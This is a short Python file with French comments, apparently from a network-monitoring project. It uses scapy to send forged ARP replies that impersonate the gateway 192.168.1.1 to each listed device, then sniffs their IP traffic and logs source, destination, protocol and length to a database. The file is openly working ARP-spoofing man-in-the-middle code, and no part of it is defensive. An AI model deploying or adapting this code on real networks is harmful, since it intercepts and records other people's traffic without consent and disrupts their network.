import scapy.all as scapy
from DB_AWS import insert_packet_data
import time

def start_spoofing(devices):
    """Démarre le spoofing ARP et la capture des paquets."""
    for device in devices:
        target_ip = device['ip']
        target_mac = device['mac']
        spoof_arp(target_ip, target_mac)

    # Capture des paquets
    scapy.sniff(prn=packet_callback, store=False)

def spoof_arp(target_ip, target_mac):
    """Spoofing ARP pour une adresse IP et MAC donnés."""
    arp_response = scapy.ARP(op=2, psrc="192.168.1.1", pdst=target_ip, hwdst=target_mac)
    scapy.send(arp_response, verbose=False)

def packet_callback(packet):
    """Capture et enregistre les paquets dans la base de données."""
    if packet.haslayer(scapy.IP):
        packet_info = {
            'src_ip': packet[scapy.IP].src,
            'dst_ip': packet[scapy.IP].dst,
            'protocol': packet.proto,
            'length': len(packet),
            'time': time.time()
        }
        insert_packet_in_db(packet_info)

def insert_packet_in_db(packet_info):
    """Insère les informations du paquet dans la base de données."""
    user_id = 1  # ID de l'utilisateur connecté
    insert_packet_data(user_id, packet_info['src_ip'], packet_info['dst_ip'],
                       packet_info['protocol'], packet_info['length'], packet_info['time'])
